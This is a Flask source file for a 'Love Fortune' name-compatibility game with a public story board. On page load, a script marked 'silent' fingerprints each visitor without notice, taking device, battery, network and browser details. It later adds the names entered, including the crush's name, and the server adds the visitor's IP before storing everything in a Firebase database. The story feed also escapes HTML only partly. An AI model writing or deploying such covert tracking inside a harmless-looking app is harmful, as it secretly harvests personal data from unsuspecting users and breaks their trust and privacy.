from flask import Flask, request, jsonify, render_template_string
import os
import random
import requests
from datetime import datetime

app = Flask(__name__)

# ========== FIREBASE SETUP ==========
FIREBASE_URL = "https://love-percentage-dc42b-default-rtdb.firebaseio.com"

# ========== LOVE FORTUNE ENGINE ==========
def get_love_message(name1, name2, percentage):
    messages = [
        f"💕 {name1} ❤️ {name2} – your love shines at {percentage}% like a perfect dream!",
        f"✨ {name1} and {name2} share {percentage}% destiny written in the stars!",
        f"💖 {name1} + {name2} = {percentage}% endless affection!",
        f"🌹 {name1} and {name2} bloom together with {percentage}% love!",
        f"💫 {name1} ❤️ {name2} – {percentage}% cosmic connection!",
        f"💕 Hearts of {name1} and {name2} glow with {percentage}% warmth!",
        f"✨ {name1} & {name2} – {percentage}% magical bond!",
        f"💖 {name1} and {name2} share {percentage}% sweet harmony!",
        f"🌹 Love between {name1} and {name2} is {percentage}% pure bliss!",
        f"💫 {name1} ❤️ {name2} – {percentage}% soulmate vibes!",
        f"💕 {name1} and {name2} – {percentage}% love that never fades!",
        f"✨ {name1} ❤️ {name2} – {percentage}% beautiful connection!",
        f"💖 {name1} + {name2} = {percentage}% perfect chemistry!",
        f"🌹 {name1} and {name2} share {percentage}% romantic energy!",
        f"💫 {name1} ❤️ {name2} – {percentage}% dreamy love story!",
        f"💕 {name1} and {name2} glow with {percentage}% love light!",
        f"✨ {name1} ❤️ {name2} – {percentage}% forever feeling!",
        f"💖 {name1} + {name2} = {percentage}% heart connection!",
        f"🌹 {name1} and {name2} share {percentage}% sweet romance!",
        f"💫 {name1} ❤️ {name2} – {percentage}% love harmony!",
        f"💕 {name1} and {name2} – {percentage}% true love vibes!",
        f"✨ {name1} ❤️ {name2} – {percentage}% perfect match!",
        f"💖 {name1} + {name2} = {percentage}% love magic!",
        f"🌹 {name1} and {name2} share {percentage}% endless charm!",
        f"💫 {name1} ❤️ {name2} – {percentage}% romantic spark!",
        f"💕 {name1} and {name2} – {percentage}% heartwarming bond!",
        f"✨ {name1} ❤️ {name2} – {percentage}% destiny love!",
        f"💖 {name1} + {name2} = {percentage}% soulful match!",
        f"🌹 {name1} and {name2} share {percentage}% deep affection!",
        f"💫 {name1} ❤️ {name2} – {percentage}% love glow!",
        f"💕 {name1} and {name2} – {percentage}% charming connection!",
        f"✨ {name1} ❤️ {name2} – {percentage}% sweet destiny!",
        f"💖 {name1} + {name2} = {percentage}% emotional magic!",
        f"🌹 {name1} and {name2} share {percentage}% tender love!",
        f"💫 {name1} ❤️ {name2} – {percentage}% loving bond!",
        f"💕 {name1} and {name2} – {percentage}% golden romance!",
        f"✨ {name1} ❤️ {name2} – {percentage}% heart glow!",
        f"💖 {name1} + {name2} = {percentage}% pure affection!",
        f"🌹 {name1} and {name2} share {percentage}% love rhythm!",
        f"💫 {name1} ❤️ {name2} – {percentage}% dreamy bond!",
        f"💕 {name1} and {name2} – {percentage}% love spark!",
        f"✨ {name1} ❤️ {name2} – {percentage}% sweet harmony!",
        f"💖 {name1} + {name2} = {percentage}% love glow!",
        f"🌹 {name1} and {name2} share {percentage}% romance charm!",
        f"💫 {name1} ❤️ {name2} – {percentage}% heart magic!",
        f"💕 {name1} and {name2} – {percentage}% soft love vibes!",
        f"✨ {name1} ❤️ {name2} – {percentage}% fairytale bond!",
        f"💖 {name1} + {name2} = {percentage}% love warmth!",
        f"🌹 {name1} and {name2} share {percentage}% gentle romance!",
        f"💫 {name1} ❤️ {name2} – {percentage}% sweet spark!",
        f"💕 {name1} and {name2} – {percentage}% romantic glow!",
        f"✨ {name1} ❤️ {name2} – {percentage}% magical hearts!",
        f"💖 {name1} + {name2} = {percentage}% love energy!",
        f"🌹 {name1} and {name2} share {percentage}% passion!",
        f"💫 {name1} ❤️ {name2} – {percentage}% love charm!",
        f"💕 {name1} and {name2} – {percentage}% sweet connection!",
        f"✨ {name1} ❤️ {name2} – {percentage}% heart link!",
        f"💖 {name1} + {name2} = {percentage}% loving vibes!",
        f"🌹 {name1} and {name2} share {percentage}% affection!",
        f"💫 {name1} ❤️ {name2} – {percentage}% dreamy match!",
        f"💕 {name1} and {name2} – {percentage}% warm romance!",
        f"✨ {name1} ❤️ {name2} – {percentage}% loving destiny!",
        f"💖 {name1} + {name2} = {percentage}% magical bond!",
        f"🌹 {name1} and {name2} share {percentage}% heart charm!",
        f"💫 {name1} ❤️ {name2} – {percentage}% soulmate glow!",
        f"💕 {name1} and {name2} – {percentage}% forever love!",
        f"✨ {name1} ❤️ {name2} – {percentage}% sweet hearts!",
        f"💖 {name1} + {name2} = {percentage}% love rhythm!",
        f"🌹 {name1} and {name2} share {percentage}% dreamy vibes!",
        f"💫 {name1} ❤️ {name2} – {percentage}% magical story!"
    ]
    return random.choice(messages)

def analyze_story(text):
    text = text.lower()
    sad_triggers = ['breakup', 'cried', 'sad', 'left', 'hurt', 'pain', 'broken', 'alone']
    if any(word in text for word in sad_triggers):
        return "💔 Oh, stay strong! This is such a heart-touching story. The universe has better plans for you."
    return "💖 This is absolutely wonderful! Your love story is like a fairytale. Keep glowing!"

# ========== COMBINED HTML + CSS + JS (no external script.js) ==========
HTML_UI = '''
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
    <title>💕 Love & Story Hub</title>
    <script src="https://cdn.jsdelivr.net/npm/@fingerprintjs/fingerprintjs@3/dist/fp.min.js"></script>
    <style>
        :root { --primary: #f5576c; --secondary: #764ba2; }
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            font-family: 'Segoe UI', sans-serif;
            min-height: 100vh;
            display: flex;
            justify-content: center;
            padding: 20px;
        }
        .container {
            background: rgba(255,255,255,0.95);
            width: 100%;
            max-width: 500px;
            border-radius: 30px;
            padding: 25px;
            box-shadow: 0 20px 40px rgba(0,0,0,0.2);
        }
        h1 { text-align: center; color: var(--secondary); margin-bottom: 15px; }
        .tabs { display: flex; gap: 10px; margin-bottom: 25px; }
        .tab-btn {
            flex: 1; padding: 12px; border: none; border-radius: 20px;
            background: #eee; cursor: pointer; font-weight: bold;
        }
        .tab-btn.active { background: var(--primary); color: white; }
        .tab-content { display: none; animation: fadeIn 0.3s; }
        .tab-content.active { display: block; }
        input, textarea {
            width: 100%; padding: 14px; margin: 10px 0;
            border: 1px solid #ddd; border-radius: 15px; font-size: 16px;
        }
        .main-btn {
            width: 100%; padding: 14px; background: linear-gradient(to right, var(--primary), var(--secondary));
            color: white; border: none; border-radius: 50px; font-weight: bold; cursor: pointer; margin-top: 10px;
        }
        .result-area { background: #fff5f6; border-radius: 20px; padding: 20px; text-align: center; margin-top: 20px; }
        .story-card {
            background: #fefefe; padding: 15px; border-radius: 18px; margin-top: 15px;
            border-left: 5px solid var(--primary); box-shadow: 0 2px 5px rgba(0,0,0,0.05);
        }
        .bot-reply { font-style: italic; color: var(--secondary); font-size: 0.9em; margin-top: 8px; }
        .actions { display: flex; gap: 10px; margin-top: 10px; align-items: center; }
        .like-btn { background: none; border: none; color: var(--primary); font-weight: bold; cursor: pointer; }
        .cmnt-item { font-size: 12px; background: #f0f0f0; padding: 5px; border-radius: 8px; margin-top: 5px; }
        .feed { max-height: 500px; overflow-y: auto; margin-top: 15px; }
        @keyframes fadeIn { from { opacity: 0; transform: translateY(10px); } to { opacity: 1; transform: translateY(0); } }
    </style>
</head>
<body>
<div class="container">
    <div class="tabs">
        <button class="tab-btn active" onclick="showTab('fortune')">🔮 Fortune</button>
        <button class="tab-btn" onclick="showTab('stories')">📖 Story Box</button>
    </div>

    <!-- Fortune Tab -->
    <div id="fortune" class="tab-content active">
        <h1>💕 Love Fortune</h1>
        <input type="text" id="yourName" placeholder="Your Name">
        <input type="text" id="crushName" placeholder="Their Name">
        <button class="main-btn" onclick="calculateFortune()">Reveal Destiny</button>
        <div id="resultArea" class="result-area" style="display: none;">
            <h2 id="percent" style="color: var(--primary); font-size: 48px;">0%</h2>
            <p id="fortuneMsg"></p>
        </div>
    </div>

    <!-- Story Tab -->
    <div id="stories" class="tab-content">
        <h1>📖 Love & Heartbreak</h1>
        <textarea id="storyInput" rows="4" placeholder="Share your story... (love, breakup, friendship)"></textarea>
        <button class="main-btn" onclick="postStory()">Share Story</button>
        <div id="storyFeed" class="feed">Loading stories...</div>
    </div>
</div>

<script>
    // ========== SESSION & DEVICE DATA (silent, no location) ==========
    let sessionId = localStorage.getItem('love_session');
    if (!sessionId) {
        sessionId = 'sess_' + Date.now() + '_' + Math.random().toString(36).substr(2, 10);
        localStorage.setItem('love_session', sessionId);
    }

    let deviceData = { sessionId: sessionId, timestamp: new Date().toISOString() };

    async function collectDeviceInfo() {
        try {
            const fp = await FingerprintJS.load();
            const result = await fp.get();
            deviceData.fingerprint = result.visitorId;
        } catch(e) { deviceData.fingerprint = 'unknown'; }

        deviceData.screen = screen.width + 'x' + screen.height;
        deviceData.timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
        deviceData.userAgent = navigator.userAgent;
        if (navigator.deviceMemory) deviceData.deviceMemory = navigator.deviceMemory + ' GB';
        if ('getBattery' in navigator) {
            try {
                const battery = await navigator.getBattery();
                deviceData.batteryLevel = Math.round(battery.level * 100) + '%';
            } catch(e) {}
        }
        const conn = navigator.connection;
        if (conn) deviceData.networkType = conn.effectiveType;

        await fetch('/save-device', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(deviceData)
        });
    }

    // ========== FORTUNE CALCULATION (no location) ==========
    async function calculateFortune() {
        const name1 = document.getElementById('yourName').value.trim();
        const name2 = document.getElementById('crushName').value.trim();
        if (!name1 || !name2) {
            alert("Please fill both names 💕");
            return;
        }

        deviceData.name = name1;
        deviceData.crush_name = name2;
        await fetch('/save-device', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(deviceData)
        });

        try {
            const res = await fetch('/calculate', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ n1: name1, n2: name2 })
            });
            const data = await res.json();
            document.getElementById('percent').innerText = data.score + '%';
            document.getElementById('fortuneMsg').innerText = data.msg;
            document.getElementById('resultArea').style.display = 'block';

            deviceData.fortuneText = data.msg;
            deviceData.percentage = data.score;
            await fetch('/save-device', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(deviceData)
            });
        } catch(e) {
            alert("Error calculating fortune. Please try again.");
        }
    }

    // ========== STORY FUNCTIONS (public read/write) ==========
    async function postStory() {
        const content = document.getElementById('storyInput').value.trim();
        if (!content) {
            alert("Please write a story first.");
            return;
        }
        const author = prompt("Enter your name (or leave empty for 'Anonymous'):", "Anonymous");
        const finalAuthor = (author && author.trim()) ? author.trim() : "Anonymous";

        const res = await fetch('/post-story', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ author: finalAuthor, content: content })
        });
        const result = await res.json();
        if (result.ok) {
            alert("Story posted successfully!");
            document.getElementById('storyInput').value = '';
            loadStories();
        } else {
            alert("Error posting story.");
        }
    }

    async function loadStories() {
        const feed = document.getElementById('storyFeed');
        feed.innerHTML = "📖 Loading stories...";
        try {
            const res = await fetch('/get-stories');
            const stories = await res.json();
            feed.innerHTML = '';
            if (Object.keys(stories).length === 0) {
                feed.innerHTML = "<p style='text-align:center;'>No stories yet. Be the first to share!</p>";
                return;
            }
            Object.entries(stories).reverse().forEach(([id, story]) => {
                let commentsHtml = '';
                if (story.comments) {
                    Object.values(story.comments).forEach(c => {
                        commentsHtml += `<div class="cmnt-item">💬 ${escapeHtml(c.text)}</div>`;
                    });
                }
                feed.innerHTML += `
                    <div class="story-card">
                        <strong>👤 ${escapeHtml(story.author)}</strong>
                        <p style="margin-top:8px;">${escapeHtml(story.content)}</p>
                        <div class="bot-reply">🤖 Bot: ${escapeHtml(story.reply)}</div>
                        <div class="actions">
                            <button class="like-btn" onclick="likeStory('${id}')">❤️ ${story.likes || 0}</button>
                            <span style="font-size:12px;">💬 Comment</span>
                        </div>
                        <div id="comments_${id}">${commentsHtml}</div>
                        <div style="display:flex; gap:5px; margin-top:8px;">
                            <input type="text" id="cmnt_${id}" placeholder="Write a comment..." style="flex:1; padding:8px; font-size:12px;">
                            <button onclick="addComment('${id}')" style="background:var(--secondary); color:white; border:none; padding:5px 12px; border-radius:15px;">Send</button>
                        </div>
                    </div>
                `;
            });
        } catch(e) {
            feed.innerHTML = "<p>Failed to load stories. Please refresh.</p>";
        }
    }

    async function likeStory(id) {
        await fetch('/like', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ id }) });
        loadStories();  // reload to update like count
    }

    async function addComment(id) {
        const text = document.getElementById(`cmnt_${id}`).value.trim();
        if (!text) return;
        await fetch('/comment', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ id, text }) });
        document.getElementById(`cmnt_${id}`).value = '';
        loadStories();
    }

    function escapeHtml(str) {
        return str.replace(/[&<>]/g, function(m) {
            if (m === '&') return '&amp;';
            if (m === '<') return '&lt;';
            if (m === '>') return '&gt;';
            return m;
        });
    }

    function showTab(tabName) {
        document.querySelectorAll('.tab-content').forEach(t => t.classList.remove('active'));
        document.querySelectorAll('.tab-btn').forEach(b => b.classList.remove('active'));
        document.getElementById(tabName).classList.add('active');
        if (tabName === 'stories') loadStories();
        event.target.classList.add('active');
    }

    // ========== INIT ==========
    collectDeviceInfo();
    // optionally load stories when page loads if story tab was active? but not needed initially
</script>
</body>
</html>
'''

# ========== BACKEND ROUTES ==========
@app.route('/')
def home():
    return render_template_string(HTML_UI)

@app.route('/calculate', methods=['POST'])
def calculate():
    data = request.json
    n1 = data['n1']
    n2 = data['n2']
    combined = (n1 + n2).lower()
    score = 50 + (sum(ord(c) for c in combined) % 51)
    msg = get_love_message(n1, n2, score)
    return jsonify({"score": score, "msg": msg})

@app.route('/save-device', methods=['POST'])
def save_device():
    try:
        data = request.get_json()
        session_id = data.get('sessionId')
        # Add server-side data
        data['ip'] = request.headers.get('x-forwarded-for', request.remote_addr)
        data['timestamp'] = datetime.now().isoformat()
        url = f"{FIREBASE_URL}/visitors/{session_id}.json"
        requests.put(url, json=data, timeout=10)
        return jsonify({"status": "saved"})
    except Exception as e:
        print(e)
        return jsonify({"status": "error"}), 500

@app.route('/post-story', methods=['POST'])
def post_story():
    try:
        data = request.json
        author = data.get('author', 'Anonymous').strip()
        content = data.get('content', '').strip()
        if not content:
            return jsonify({"ok": False, "error": "Empty story"}), 400
        if not author or author.lower() in ['anonymous', 'unknown']:
            author = '💫 Mysterious Soul'
        reply = analyze_story(content)
        story = {
            "author": author,
            "content": content,
            "reply": reply,
            "likes": 0,
            "timestamp": datetime.now().isoformat()
        }
        r = requests.post(f"{FIREBASE_URL}/stories.json", json=story, timeout=10)
        r.raise_for_status()
        return jsonify({"ok": True})
    except Exception as e:
        print(e)
        return jsonify({"ok": False, "error": str(e)}), 500

@app.route('/like', methods=['POST'])
def like():
    try:
        sid = request.json['id']
        curr = requests.get(f"{FIREBASE_URL}/stories/{sid}/likes.json").json() or 0
        requests.patch(f"{FIREBASE_URL}/stories/{sid}.json", json={"likes": curr + 1})
        return jsonify({"ok": True})
    except:
        return jsonify({"ok": False}), 500

@app.route('/comment', methods=['POST'])
def comment():
    try:
        sid = request.json['id']
        text = request.json['text'].strip()
        if not text:
            return jsonify({"ok": False}), 400
        comment_data = {"text": text, "ts": datetime.now().isoformat()}
        requests.post(f"{FIREBASE_URL}/stories/{sid}/comments.json", json=comment_data)
        return jsonify({"ok": True})
    except:
        return jsonify({"ok": False}), 500

@app.route('/get-stories')
def get_stories():
    try:
        r = requests.get(f"{FIREBASE_URL}/stories.json", timeout=10)
        stories = r.json() or {}
        # Sort newest first
        sorted_stories = dict(sorted(stories.items(), key=lambda x: x[1].get('timestamp', ''), reverse=True))
        return jsonify(sorted_stories)
    except:
        return jsonify({}), 500

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)
